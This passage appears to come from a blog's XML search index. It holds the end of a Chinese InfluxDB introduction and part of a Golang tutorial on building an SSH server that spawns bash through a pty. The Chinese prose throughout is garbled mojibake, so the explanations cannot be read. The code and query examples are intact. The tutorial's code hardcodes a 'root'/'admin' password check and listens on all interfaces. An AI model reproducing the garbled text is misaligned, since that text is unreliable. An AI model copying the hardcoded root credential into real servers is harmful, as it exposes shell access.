‡æ¥æºäºŽå“ªä¸ªåœ°æ–¹ã€‚ åœ¨æŒ‡æ ‡çš„å€¼ä¸Šèƒ½åšä¸€äº›åŸºæœ¬çš„æ¯”è¾ƒè¿ç®—ä½œä¸ºä¸€ä¸ªæ•°æ®åº“,åœ¨åŠŸèƒ½å±‚é¢éœ€è¦è§£å†³ä¸€äº›åŸºæœ¬çš„è¿ç®—, æ¯”å¦‚æ±‚å’Œï¼Œæ±‚æœ€å°ï¼Œæ±‚æœ€å¤§, ä½†è¿™è¿˜ä¸å¤Ÿ, éœ€è¦æ”¯æŒæ¡ä»¶è¿‡æ»¤, æ”¯æŒTagçš„æ¡ä»¶è¿‡æ»¤, æ”¯æŒå€¼çš„æ¡ä»¶è¿‡æ»¤, æ”¯æŒå€¼çš„æ¡ä»¶è¿‡æ»¤æ˜¯å…³é”®, ä¸ç„¶ä¼šäº§ç”Ÿå·¨å¤§çš„æ•°æ®å¤åˆ¶, æ¯”å¦‚æˆ‘ä»¬éœ€è¦è¿‡æ»¤å‡º CPU &gt; 90çš„æœºå™¨, å¦‚æžœæ•°æ®åº“ä¸æ”¯æŒ, é‚£ä¹ˆæˆ‘éœ€è¦å°†è¿™äº›æ•°æ®ä»Žæ•°æ®åº“ä¸­æŸ¥å‡ºæ¥,å¤åˆ¶ç»™æˆ‘çš„ç¨‹åºå¤„ç†ã€‚ è¿™å¸¦æ¥äº†å·¨å¤§çš„é—®é¢˜: 1. æ•°æ®åº“è¦åå‡ºå¦‚æ­¤å¤§é‡çš„æ•°æ®, è´Ÿè½½å‡é«˜, å‡ºå£æµé‡æš´å¢ž 2.ç¨‹åºæ‹¿åˆ°å¦‚æ­¤å¤§é‡çš„æ•°æ®, ç»™å¤„ç†æ–¹å¸¦æ¥äº†å·¨å¤§çš„è®¡ç®—åŽ‹åŠ›, å¦‚æžœå‰æ®µé‡‡ç”¨Angularæˆ–è€…Reactæ¥å†™, ä¸€ä¸ªè¿è¡Œåœ¨pcä¸Šçš„å°å°çš„æµè§ˆå™¨,æ ¹æœ¬å¤„ç†ä¸äº†ã€‚3. å¤„ç†æ•ˆçŽ‡ä½Žï¼Œæ•°æ®çš„å¤„ç†æœ¬è¯¥åœ¨æ•°æ®å­˜å‚¨çš„åœ°æ–¹è¿›è¡Œ, æ¯”å¦‚Hadoop, å®Œå…¨æ²¡å¿…è¦å¤åˆ¶ã€‚ æŒ‡æ ‡è®¡ç®—çš„ä¸­é—´ç»“æžœéœ€è¦å­˜ä¼šæŒ‡æ ‡è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„åœºæ™¯, ä½¿ç”¨RDDæ—¶æ›´æ˜¯å¸¸ç”¨,æ¯”å¦‚æ•°æ®æ˜¯æŒ‰ç…§30ç§’å­˜å‚¨çš„ï¼Œä½†æ˜¯æˆ‘éœ€è¦ è¿™æ ·ä¸€ä¸ªèšåˆç»´åº¦ 5m, 15m, 1h, 3h, 12h, ç„¶åŽæˆ‘å¹³æ—¶åªä½¿ç”¨è¿™äº›ç»´åº¦çš„æ•°æ®, ä¸ç”¨æ¯æ¬¡ä¸´æ—¶è®¡ç®—ã€‚ æ¦‚å¿µä»‹ç»influxDBçš„æ ¸å¿ƒæ¦‚å¿µåŒ…å«: Line Protocol, Retention Policy, Series, Point, Continuous Query. Line ProtocolLine Protocolç”¨äºŽæè¿°å­˜å…¥æ•°æ®åº“çš„æ•°æ®æ ¼å¼, ä¹Ÿå¯ä»¥è¯´æ˜¯æ•°æ®åè®®, ç›¸æ¯”äºŽJSONæ ¼å¼ï¼ŒLine Protocolæ— éœ€åºåˆ—åŒ–ï¼Œæ›´åŠ é«˜æ•ˆ, å®˜æ–¹å¯¹å®ƒåšäº†å…¨é¢çš„ä»‹ç»Line Protocol, ä¸‹é¢æ‘˜å–è¯­æ³•éƒ¨åˆ†åšç®€è¦è¯´æ˜Žï¼šLine Protocolé‡Œé¢çš„ä¸€è¡Œå°±æ˜¯InfluxDBé‡Œé¢çš„ä¸€ä¸ªç‚¹ä½, ä»–å°†ä¸€ä¸ªç‚¹åˆ†å‰²æˆmeasurement, tag_set, field_set, timestamp4ä¸ªéƒ¨åˆ†, ä¾‹å¦‚:12345678910è¯­æ³•æ ¼å¼: measurement[,tag_key1=tag_value1...] field_key=field_value[,field_key2=field_value2] [timestamp]æ —å­:weather,location=us-midwest temperature=82 1465839830100400200 | -------------------- -------------- | | | | | | | | |+-----------+--------+-+---------+-+---------+|measurement|,tag_set| |field_set| |timestamp|+-----------+--------+-+---------+-+---------+ measurement: metric name, éœ€è¦ç›‘æŽ§çš„æŒ‡æ ‡çš„åç§°, æ¯”å¦‚ä¸Šé¢çš„weather tag_set: ä½¿ç”¨â€,â€ä¸Žmeasurementéš”å¼€, è¡¨ç¤ºä¸€ç»„Tagçš„é›†åˆ, ç”¨äºŽä¿å­˜ç‚¹ä½çš„å…ƒæ•°æ®, ä¸ºå¯é€‰é¡¹, ä¼šè¿›è¡Œç´¢å¼•ï¼Œæ–¹ä¾¿æŸ¥è¯¢æ—¶ç”¨äºŽè¿‡æ»¤æ¡ä»¶ï¼Œ æ ¼å¼: =,=, æ¯”å¦‚ä¸Šé¢çš„location=us-midwest field_set: ä½¿ç”¨ç©ºæ ¼ä¸Žtag_setéš”å¼€, æ ‡ç¤ºä¸€ç»„Fieldçš„é›†åˆ, ç”¨äºŽä¿å­˜è¯¥ç‚¹ä½å¤šç»´åº¦çš„å€¼, æ”¯æŒå„ç§ç±»åž‹ï¼Œæ•°æ®å­˜å‚¨æ—¶ä¸ä¼šè¿›è¡Œç´¢å¼•,æ ¼å¼: =,=, æ¯”å¦‚ä¸Šé¢çš„temperature=82 timestamp: é‡‡é›†è¯¥ç‚¹ä½çš„æ—¶é—´æˆ³, æ—¶é—´çš„é»˜è®¤ç²¾åº¦æ˜¯çº³ç§’. å­˜å‚¨ç­–ç•¥:measurements,tag keys,field keys,tag valueså…¨å±€å­˜ä¸€ä»½ã€‚field valueså’Œtimestampsæ¯æ¡æ•°æ®å­˜ä¸€ä»½ã€‚ Retention PolicyæŒ‡æ•°æ®çš„ä¿å­˜ç­–ç•¥, åŒ…å«æ•°æ®çš„ä¿å­˜æ—¶é—´å’Œå‰¯æœ¬æ•°(é›†ç¾¤ä¸­çš„æ¦‚å¿µ),é»˜è®¤ä¿å­˜æ—¶é—´æ˜¯æ°¸ä¹…ï¼Œå‰¯æœ¬æ˜¯1ä¸ª, ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹, ä¹Ÿå¯ä»¥åˆ›å»ºæ–°çš„ä¿å­˜ç­–ç•¥ SeriesInfluxDBä¸­å…ƒæ•°æ®çš„æ•°æ®ç»“æž„ä½“, seriesç›¸å½“äºŽæ˜¯InfluxDBä¸­å…ƒæ•°æ®çš„é›†åˆï¼Œåœ¨åŒä¸€ä¸ªdatabaseä¸­ï¼Œretention policyã€measurementã€tag setså®Œå…¨ç›¸åŒçš„æ•°æ®åŒå±žäºŽä¸€ä¸ªseriesï¼ŒåŒä¸€ä¸ªseriesçš„æ•°æ®åœ¨ç‰©ç†ä¸Šä¼šæŒ‰ç…§æ—¶é—´é¡ºåºæŽ’åˆ—å­˜å‚¨åœ¨ä¸€èµ·ã€‚series çš„keyä¸º measurement+æ‰€æœ‰tagsçš„åºåˆ—åŒ–å­—ç¬¦ä¸², ä»–ä¿å­˜ç€è¯¥seriesçš„Retention policy, Measurement,Tag set, æ¯”å¦‚:123456|--------------------------------------------------------------------------------------------------||Arbitrary series number | Retention policy | Measurement | Tag set ||series 1 | autogen | census | location = 1,scientist = langstroth ||series 2 | autogen | census | location = 2,scientist = langstroth ||series 3 | autogen | census | location = 1,scientist = perpetua ||--------------------------------------------------------------------------------------------------| PointInfluxDBä¸­å•æ¡æ’å…¥è¯­å¥çš„æ•°æ®ç»“æž„ä½“, ç”¨äºŽä¿å­˜ç‚¹ä½çš„å€¼çš„é›†åˆ, æ¯ä¸€ä¸ªPointé€šè¿‡serieså’Œtimestampè¿›è¡Œå”¯ä¸€æ ‡ç¤º:1234name: census-----------------time butterflies honeybees location scientist2015-08-18T00:00:00Z 1 30 1 perpetua Schemaç”¨äºŽæè¿°æ•°æ®åœ¨InfluxDBçš„ç»„ç»‡å½¢å¼, InfluxDBçš„Schemaååˆ†ç®€å•ç”± è¿™äº›æ¦‚å¿µç»„æˆ: databases retention policies series measurements tag keys tag values field keysåœ¨æ“ä½œæ•°æ®åº“çš„æ—¶å€™ï¼Œéœ€è¦çŸ¥é“è¿™äº›æ¦‚å¿µã€‚ Continuous Queryç®€ç§°CQ, æ˜¯é¢„å…ˆé…ç½®å¥½çš„ä¸€äº›æŸ¥è¯¢å‘½ä»¤ï¼ŒSELECTè¯­å¥å¿…é¡»åŒ…å«GROUP BY time()ï¼Œinfluxdbä¼šå®šæœŸè‡ªåŠ¨æ‰§è¡Œè¿™äº›å‘½ä»¤å¹¶å°†æŸ¥è¯¢ç»“æžœå†™å…¥æŒ‡å®šçš„å¦å¤–çš„measurementä¸­ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¹¶ç»“åˆRPæˆ‘ä»¬å¯ä»¥æ–¹ä¾¿åœ°ä¿å­˜ä¸åŒç²’åº¦çš„æ•°æ®ï¼Œæ ¹æ®æ•°æ®ç²’åº¦çš„ä¸åŒè®¾ç½®ä¸åŒçš„ä¿å­˜æ—¶é—´ï¼Œè¿™æ ·ä¸ä»…èŠ‚çº¦äº†å­˜å‚¨ç©ºé—´ï¼Œè€Œä¸”åŠ é€Ÿäº†æ—¶é—´é—´éš”è¾ƒé•¿çš„æ•°æ®æŸ¥è¯¢æ•ˆçŽ‡ï¼Œé¿å…æŸ¥è¯¢æ—¶å†è¿›è¡Œèšåˆè®¡ç®—ã€‚ å­˜å‚¨å¼•æ“Žä»ŽLevelDB(LSM Tree)ï¼Œåˆ°BoltD(mmap B+æ ‘)ï¼ŒçŽ°åœ¨æ˜¯è‡ªå·±å®žçŽ°çš„TSM Treeçš„ç®—æ³•ï¼Œç±»ä¼¼LSM Treeï¼Œé’ˆå¯¹InfluxDBçš„ä½¿ç”¨åšäº†ç‰¹æ®Šä¼˜åŒ–ã€‚ ShardShardè¿™ä¸ªæ¦‚å¿µå¹¶ä¸å¯¹æ™®é€šç”¨æˆ·å¼€æ”¾ï¼ŒShardä¹Ÿä¸æ˜¯å­˜å‚¨å¼•æ“Ž, å®ƒåœ¨å­˜å‚¨å¼•æ“Žä¹‹ä¸Šçš„ä¸€ä¸ªæ¦‚å¿µ, å­˜å‚¨å¼•æ“Žè´Ÿè´£å­˜å‚¨shard, å› æ­¤åœ¨è®²å­˜å‚¨å¼•æ“Žä¹‹å‰å…ˆè®²æ˜Žshardã€‚ åœ¨InfluxDBä¸­æŒ‰ç…§æ•°æ®çš„æ—¶é—´æˆ³æ‰€åœ¨çš„èŒƒå›´ï¼Œä¼šåŽ»åˆ›å»ºä¸åŒçš„shardï¼Œæ¯ä¸€ä¸ªshardéƒ½æœ‰è‡ªå·±çš„å­˜å‚¨å¼•æ“Žç›¸å…³æ–‡ä»¶ï¼Œè¿™æ ·åšçš„ç›®çš„å°±æ˜¯ä¸ºäº†å¯ä»¥é€šè¿‡æ—¶é—´æ¥å¿«é€Ÿå®šä½åˆ°è¦æŸ¥è¯¢æ•°æ®çš„ç›¸å…³èµ„æºï¼ŒåŠ é€ŸæŸ¥è¯¢çš„è¿‡ç¨‹ï¼Œå¹¶ä¸”ä¹Ÿè®©ä¹‹åŽçš„æ‰¹é‡åˆ é™¤æ•°æ®çš„æ“ä½œå˜å¾—éžå¸¸ç®€å•ä¸”é«˜æ•ˆã€‚ å®ƒå’Œretention policyç›¸å…³è”ã€‚æ¯ä¸€ä¸ªå­˜å‚¨ç­–ç•¥ä¸‹ä¼šå­˜åœ¨è®¸å¤šshardï¼Œæ¯ä¸€ä¸ªshardå­˜å‚¨ä¸€ä¸ªæŒ‡å®šæ—¶é—´æ®µå†…çš„æ•°æ®ï¼Œå¹¶ä¸”ä¸é‡å¤ï¼Œä¾‹å¦‚7ç‚¹-8ç‚¹çš„æ•°æ®è½å…¥shard0 ä¸­ï¼Œ8ç‚¹-9ç‚¹çš„æ•°æ®åˆ™è½å…¥shard1ä¸­ã€‚æ¯ä¸€ä¸ªshardéƒ½å¯¹åº”ä¸€ä¸ªåº•å±‚çš„å­˜å‚¨å¼•æ“Žã€‚ å½“æ£€æµ‹åˆ°ä¸€ä¸ªshardä¸­çš„æ•°æ®è¿‡æœŸåŽï¼Œåªéœ€è¦å°†è¿™ä¸ªshardçš„èµ„æºé‡Šæ”¾ï¼Œç›¸å…³æ–‡ä»¶åˆ é™¤å³å¯ï¼Œè¿™æ ·çš„åšæ³•ä½¿å¾—åˆ é™¤è¿‡æœŸæ•°æ®å˜å¾—éžå¸¸é«˜æ•ˆã€‚ LevelDBBoltDBTSM TreeåŠŸèƒ½ä½¿ç”¨å®‰è£…ä¸Žéƒ¨ç½²æˆ‘è¿™é‡Œä¸»è¦åšåŠŸèƒ½æµ‹è¯•, åŽé¢ä¼šæœ‰æœºä¼šä¸“é—¨åšæ€§èƒ½æµ‹è¯•, å› æ­¤è¿™é‡Œä½¿ç”¨å®˜æ–¹æä¾›çš„dockeré•œåƒéƒ¨ç½²,å®˜æ–¹é•œåƒæœ€æ–°ä¹Ÿæ˜¯1.2ç‰ˆæœ¬é…ç½®Daocloudçš„é•œåƒåŠ é€Ÿæºæˆ–è€…é˜¿é‡Œçš„åŠ é€Ÿæº,ç„¶åŽç›´æŽ¥æ‹‰å–é•œåƒ1docker pull influxdb ç”±äºŽinfluxDBå¼€å‘æ—¶å°±è®¾è®¡å¥½äº†, å®˜æ–¹ä¹Ÿç»™å‡ºäº†çŽ¯å¢ƒé…ç½®å˜é‡,å¯åŠ¨æ—¶å¯ä»¥é€šè¿‡è¿™äº›çŽ¯å¢ƒå˜é‡å¯¹influxdbè¿›è¡Œé…ç½®InfluxDBé…ç½® å‡½æ•°ä¸ŽSQLå†…éƒ¨æä¾›å¾ˆå¤šå‡½æ•°,æ–¹ä¾¿ä¸€äº›åŸºæœ¬æ“ä½œInfluxQL Functions123456789101112131415161718192021222324252627282930&gt; SELECT MEAN("water_level") FROM "h2o_feet" WHERE "location"='coyote_creek' AND time &gt;= '2015-08-18T00:06:00Z' AND time &lt;= '2015-08-18T00:54:00Z' GROUP BY time(18m)name: h2o_feettime mean---- ----2015-08-18T00:00:00Z 7.9462015-08-18T00:18:00Z 7.63233333333333252015-08-18T00:36:00Z 7.2386666666666672015-08-18T00:54:00Z 6.982&gt; SELECT MAX("water_level") FROM "h2o_feet" WHERE time &gt;= '2015-08-18T00:00:00Z' AND time &lt; '2015-08-18T00:54:00Z' GROUP BY time(12m), "location"name: h2o_feettags: location = coyote_creektime max---- ---2015-08-18T00:00:00Z 8.122015-08-18T00:12:00Z 7.8872015-08-18T00:24:00Z 7.6352015-08-18T00:36:00Z 7.3722015-08-18T00:48:00Z 7.11name: h2o_feettags: location = santa_monicatime max---- ---2015-08-18T00:00:00Z 2.1162015-08-18T00:12:00Z 2.1262015-08-18T00:24:00Z 2.0512015-08-18T00:36:00Z 2.0672015-08-18T00:48:00Z 1.991 ç”¨æˆ·è®¤è¯å’Œæƒé™Retention PolicyCotinuous Queryå¸¸è§æ“ä½œ(SQL)æ€§èƒ½å»ºè®®å®˜æ–¹æœ‰å¾ˆè¯¦è§£çš„è¯´æ˜Ž,æˆ‘è¿™é‡Œä»…æˆªå–å‡ºå•èŠ‚ç‚¹éƒ¨åˆ†:å®˜æ–¹æŽ¨èç¡¬ä»¶é…ç½® Load Field writes per second MOderate queries per second Unique series Low &lt; 5 thousand &lt; 5 &lt; 100 thousand Moderate &lt; 250 thousand &lt; 25 &lt; 1 million High &gt; 250 &gt; 25 &gt; 1 million Probobly infeasible &gt; 750 thousand &gt; 100 &gt; 10 million æ ¹æ®è´Ÿè½½æƒ…å†µå®˜æ–¹æŽ¨èçš„ç¡¬ä»¶éœ€æ±‚: Load CPU RAM IOPS Low 2-4 cores 2-4 G 500 Moderate 4-6 cores 8-32 G 500-1000 High 8 cores 32+ G 1000+]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
        <category>æ—¶åºæ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>influxdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·³æ¿æœºç³»åˆ—(å››)-Golangä¸­SSHæœåŠ¡ç«¯çš„å®žçŽ°]]></title>
    <url>%2F2017%2F02%2F23%2Fgo-ssh-server%2F</url>
    <content type="text"><![CDATA[ä¸Šç¯‡åšå®¢ä»‹ç»äº†å¦‚ä½•äº²æ‰‹å®žçŽ°ä¸€ä¸ªSSHçš„å®¢æˆ·ç«¯, è¿™ç¯‡åšå®¢å°†ä»‹ç»å¦‚ä½•ä½¿ç”¨golangçš„SSHåŒ…æž„å»ºä¸€ä¸ªè‡ªå·±çš„SSH Server, è¿™æ ·æˆ‘ä»¬åŸºæœ¬å°±èƒ½æ¯”è¾ƒå…¨é¢çš„äº†è§£çš„SSHçš„å®žçŽ°ã€‚ä¸ºæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªSSH Proxyå¥ å®šåŸºçŸ³ã€‚ ç®€ä»‹ ä»¥ä¸Šæ˜¯SSHåè®®ä¸€ä¸ªåŸºæœ¬æž¶æž„å›¾, å…³äºŽSSHåè®®çš„ç®€ä»‹å¯ä»¥å‚è€ƒè·³æ¿æœºç³»åˆ—(äºŒ)-sshåè®®åŽŸç†ç®€ä»‹, åªæœ‰åœ¨äº†è§£äº†SSHåè®®ç›¸å…³çš„åŸºç¡€ä¸Š,æ‰èƒ½ç†è§£SSHåŒ…é‡Œé¢çš„å‚æ•°ã€‚å¯¹ç…§ç€SSHåè®®, å°†ä¸Šé¢çš„æž¶æž„å›¾åšç®€è¦è§£è¯»: TCP: å»ºç«‹ä¼ è¾“å±‚é“¾æŽ¥, ç„¶åŽè¿›è¡ŒSSHåè®®å¤„ç† Handshake: å»ºç«‹SSHåè®®é‡Œé¢çš„ä¼ è¾“å±‚[SSH-TRANS,è¯¥å±‚ä¸»è¦æä¾›åŠ å¯†ä¼ è¾“ Authentication: SSHåè®®é‡Œé¢çš„ç”¨æˆ·è®¤è¯å±‚[SSH-USERAUTH], æä¾›ç”¨æˆ·è®¤è¯ Channelå’ŒRequest: è¿™äº›éƒ½æ˜¯SSHåè®®é‡Œé¢çš„é“¾æŽ¥å±‚[SSH-CONNECT], è¯¥å±‚ä¸»è¦æ˜¯å°†å¤šä¸ªåŠ å¯†éš§é“åˆ†æˆé€»è¾‘é€šé“, å¯ä»¥å¤ç”¨é€šé“,é€šé“æœ‰æ¯”è¾ƒå¤šçš„ç±»åž‹ï¼šsessionã€x11ã€forwarded-tcpipã€direct-tcpip, é€šé“é‡Œé¢çš„Requestsæ˜¯ç”¨äºŽæŽ¥æ”¶åˆ›å»ºssh channleçš„è¯·æ±‚çš„, è€Œssh channleå°±æ˜¯é‡Œé¢çš„connection, æ•°æ®çš„äº¤äº’åŸºäºŽconnectionäº¤äº’ã€‚ Serveré…ç½® é¦–å…ˆ, æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªSSH Serverçš„é…ç½®, è¿™é‡Œä¸»è¦æ˜¯é…ç½®è®¤è¯, ä½œä¸ºä¸€ä¸ªSSH Serveré»˜è®¤æ˜¯åº”è¯¥æ”¯æŒ2è®¤è¯: å¯†é’¥è®¤è¯å’Œå¯†ç è®¤è¯, ä¸ºäº†æ–¹ä¾¿æˆ‘ä»…å®žçŽ°å¯†ç è®¤è¯ã€‚å®žçŽ°å¯†ç è®¤è¯çš„æ ¸å¿ƒæ˜¯å®žçŽ°Server Configå¯¹è±¡é‡Œé¢çš„PasswordCallbackçš„å‡½æ•°, è¯¥å‡½æ•°çš„æ ¸å¿ƒæ˜¯è¿”å›žä¸€ä¸ªssh.Permissionså¯¹è±¡, è¯¥å¯¹è±¡ä¿æŒäº†Userè®¤è¯é€šè¿‡çš„ä¿¡æ¯ã€‚è¿™é‡Œä¸ºäº†æ–¹ä¾¿, å¹¶æ²¡æœ‰å°†è®¤è¯ç³»ç»Ÿå’ŒPAMå¯¹æŽ¥, è€Œæ˜¯ç›´æŽ¥ç®€å•çš„å®žçŽ°äº†ä¸€ä¸ªç”¨æˆ·åå¯†ç æ¯”è¾ƒã€‚è¿™ä¹Ÿæ˜¯å¾ˆæ ¸å¿ƒçš„ä¸€ä¸ªç‚¹, åŸºäºŽæ­¤ æˆ‘ä»¬åœ¨è®¾è®¡è·³æ¿æœºçš„æ—¶å€™, å¯ä»¥å®žçŽ°Serverç«¯çš„ç»Ÿä¸€è®¤è¯, åœ¨è¿™é‡Œæ’å…¥ç»Ÿä¸€è®¤è¯çš„ä»£ç ã€‚ 12345678config := &amp;ssh.ServerConfig&#123; PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) &#123; if c.User() == "root" &amp;&amp; string(pass) == "admin" &#123; return nil, nil &#125; return nil, fmt.Errorf("password rejected for %q", c.User()) &#125;,&#125; å…¶æ¬¡, æˆ‘ä»¬éœ€è¦é…ç½®SSH Serverçš„ç§é’¥, éœ€è¦ä¿è¯ç§é’¥çš„å®‰å…¨, å› ä¸ºä»–ç”¨äºŽè¿›è¡Œç§˜é’¥äº¤æ¢ç®—æ³•çš„å…³é”®(DH)1234567891011privateBytes, err := ioutil.ReadFile("id_rsa")if err != nil &#123; log.Fatal("Failed to load private key (./id_rsa)")&#125;private, err := ssh.ParsePrivateKey(privateBytes)if err != nil &#123; log.Fatal("Failed to parse private key")&#125;config.AddHostKey(private) å»ºç«‹SSHé€šé“(SSHé“¾æŽ¥å±‚) SSH Serveré…ç½®å®ŒæˆåŽ, é¦–å…ˆå¾—å»ºç«‹TCPé“¾æŽ¥123456789101112listener, err := net.Listen("tcp", "0.0.0.0:2200")if err != nil &#123; log.Fatalf("Failed to listen on 2200 (%s)", err)&#125;log.Print("Listening on 2200...")for &#123; conn, err := listener.Accept() if err != nil &#123; log.Printf("Failed to accept incoming connection (%s)", err) continue &#125; ç„¶åŽæˆ‘ä»¬é€šè¿‡ssh.NewServerConnæ¥å‡çº§TCPé“¾æŽ¥ä¸ºSSHé“¾æŽ¥, sshæä¾›çš„è¿™ä¸ªå‡½æ•°æ ¹æ®ä¹‹å‰çš„é…ç½®å®Œæˆ: 1. ä¼ è¾“å±‚[SSH-TRANS] 2. è®¤è¯å±‚[SSH-USERAUTH] 3. è¿”å›žé“¾æŽ¥å±‚çš„é€šé“: incomingChannels, æŽ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨Goroutineé‡Œé¢å¤„ç†è¿™äº›ç”¨æˆ·çš„é€šé“ã€‚1234567891011 sshConn, chans, reqs, err := ssh.NewServerConn(conn, config) if err != nil &#123; log.Printf("Failed to handshake (%s)", err) continue &#125; // Discard all global out-of-band Requests go ssh.DiscardRequests(reqs) // Accept all channels go handleChannels(chans)&#125; è¿™æ ·æˆ‘ä»¬å°±å·²ç»å®Œæˆäº†SSH Serverçš„è¿žæŽ¥çš„ç›‘å¬ ä¸ºäº†ä¸é˜»å¡žé€šé“çš„å¤„ç†, æˆ‘ä»¬å°†æ¯ä¸€ä¸ªé€šé“çš„å¤„ç†éƒ½æ”¾åˆ°Goroutineé‡Œé¢è¿›è¡Œ12345func handleChannels(chans &lt;-chan ssh.NewChannel) &#123; for newChannel := range chans &#123; go handleChannel(newChannel) &#125;&#125; åœ¨å¤„ç†ssh channelé‡Œé¢çš„æ•°æ®ä¹‹å‰, æˆ‘ä»¬éœ€è¦çŸ¥é“channelçš„ç±»åž‹, å› ä¸ºä¸åŒç±»åž‹çš„channelé‡Œé¢æ˜¯ä¸åŒç±»åž‹çš„æ•°æ®, å¤„ç†é€»è¾‘ä¹Ÿä¸ä¸€æ ·å…·ä½“è§rfc4250çš„4.9.1, é‡Œé¢æœ‰æ¯”è¾ƒè¯¦è§£çš„è§£é‡Š, æˆ‘ä»¬å…ˆä¸å®žçŽ°å…¶ä»–çš„,ä»…å®žçŽ°å¤„ç†sessionç±»åž‹channelã€‚ä¸Šé¢æåˆ°äº†é€šé“æœ‰4ç§ç±»åž‹, æ¯ç§ç±»åž‹éƒ½æœ‰ä¸åŒçš„ç”¨é€”,è¿™é‡Œæˆ‘ä»¬ä»…å®žçŽ°sessionç±»åž‹é€šé“çš„å¤„ç†ã€‚123456func handleChannel(newChannel ssh.NewChannel) &#123; if t := newChannel.ChannelType(); t != "session" &#123; newChannel.Reject(ssh.UnknownChannelType, "unknown channel type") return &#125;&#125; å»ºç«‹SSH Channel(å›žè¯äº¤äº’) é€šé“æä¾›ä¸€ä¸ªAcceptæ–¹æ³•, è¯¥æ–¹æ³•è¿”å›ž2ä¸ªqueue, 1ä¸ªç”¨äºŽæ•°æ®äº¤æ¢(æž¶æž„å›¾é‡Œé¢çš„connection), 1ä¸ªç”¨äºŽæŽ§åˆ¶æŒ‡ä»¤çš„äº¤äº’,æ¯”å¦‚åˆ›å»ºconnection queue(æž¶æž„å›¾é‡Œé¢çš„requests)12345connection, requests, err := newChannel.Accept()if err != nil &#123; log.Printf("Could not accept channel (%s)", err) return&#125; æ•°æ®äº¤äº’æˆ‘ä»¬å°†è¿è¡Œbashç¨‹åº,ç„¶åŽbashä¸Ž ssh channelå¯¹æŽ¥, ä»Žè€Œå®žçŽ°å’Œbashçš„è¿œç¨‹äº¤äº’, ä»Žè¿™é‡Œå¯ä»¥çœ‹å‡º, å…¶å®žè¿™é‡Œå¯ä»¥æ‰©å±•æ€§å¾ˆé«˜, æˆ‘ä»¬å¦‚æžœè¿è¡Œå…¶ä»–æœåŠ¡æ¯”å¦‚git,é‚£ä¹ˆgitä¹Ÿå¯é€šè¿‡sshé“¾æŽ¥æ¥äº¤äº’ã€‚ gitä¹Ÿæ­£æ˜¯é€šè¿‡è¿™ç§æ–¹å¼æ”¯æŒsshçš„ã€‚è¿™é‡Œå‡†å¤‡äº†ä¸€ä¸ªcolseå‡½æ•°ç”¨äºŽå…³é—­ssh channelå’Œé€€å‡ºbashç¨‹åº1234567891011bash := exec.Command("bash")// Prepare teardown functionclose := func() &#123; _, err := bash.Process.Wait() if err != nil &#123; log.Printf("Failed to exit bash (%s)", err) &#125; connection.Close() log.Printf("Session closed")&#125; å¦‚æžœæˆ‘ä»¬ç›´æŽ¥å°†bashçš„è¾“å…¥å’Œè¾“å‡ºæµè¡Œterminalè¿™å°†å¤±è´¥, å› ä¸ºbashæ²¡æœ‰è¿è¡Œåœ¨ttyä¸­, å› æ­¤è¿™é‡Œéœ€è¦ä¸€ä¸ªæ¨¡æ‹Ÿtty(pty)æ¥è¿è¡Œbashã€‚123456bashf, err := pty.Start(bash)if err != nil &#123; log.Printf("Could not start pty (%s)", err) close() return&#125; æŽ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å°† bashçš„ç®¡é“å’Œconnectionçš„ç®¡é“å¯¹æŽ¥èµ·æ¥, è¿™é‡Œä¸ºäº†ä¿è¯colseå‡½æ•°(connectionèµ„æºé‡Šæ”¾)åªè¢«è°ƒç”¨ä¸€æ¬¡ä½¿ç”¨çš„sync.Onceã€‚123456789var once sync.Oncego func() &#123; io.Copy(connection, bashf) once.Do(close)&#125;()go func() &#123; io.Copy(bashf, connection) once.Do(close)&#125;() æŒ‡ä»¤äº¤äº’è¿™é‡Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç±»è¯·æ±‚: shell/exec/subsystem: channel request type for shell, è¿™å‡ ç±»ä¸»è¦æ˜¯ç”¨äºŽåŒºåˆ†connectioné“¾æŽ¥çš„ç¨‹åº, shellå€¼åŽé¢å¯åŠ¨çš„ä¸€ä¸ªç¨‹åºæˆ–è€…shell, execæŒ‡åŽé¢å¯åŠ¨çš„æ˜¯ç”¨æˆ·çš„é»˜è®¤shell, è€Œsubsystemæ˜¯åœ¨åŽé¢å¯åŠ¨ä¸€ä¸ªå­ç¨‹åºæ¥æ‰§è¡Œconnectioné‡Œé¢çš„å‘½ä»¤ pty-req: å‡†å¤‡ä¸€ä¸ªptyç­‰å¾…è¾“å…¥ window-change: ç›‘å¬ttyçª—å£æ”¹å˜äº‹ä»¶ã€‚åŠæ—¶æ›´æ–°tty sizeã€‚123456789101112131415161718192021 go func() &#123; for req := range requests &#123; switch req.Type &#123; case "shell": // We only accept the default shell // (i.e. no command in the Payload) if len(req.Payload) == 0 &#123; req.Reply(true, nil) &#125; case "pty-req": termLen := req.Payload[3] w, h := parseDims(req.Payload[termLen+4:]) SetWinsize(bashf.Fd(), w, h) req.Reply(true, nil) case "window-change": w, h := parseDims(req.Payload) SetWinsize(bashf.Fd(), w, h) &#125; &#125; &#125;()&#125; å®Œæ•´ä»£ç ä»¥ä¸‹æ˜¯å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184package mainimport ( "encoding/binary" "fmt" "io" "io/ioutil" "log" "net" "os/exec" "sync" "syscall" "unsafe" "github.com/kr/pty" "golang.org/x/crypto/ssh")func main() &#123; // In the latest version of crypto/ssh (after Go 1.3), the SSH server type has been removed // in favour of an SSH connection type. A ssh.ServerConn is created by passing an existing // net.Conn and a ssh.ServerConfig to ssh.NewServerConn, in effect, upgrading the net.Conn // into an ssh.ServerConn config := &amp;ssh.ServerConfig&#123; //Define a function to run when a client attempts a password login PasswordCallback: func(c 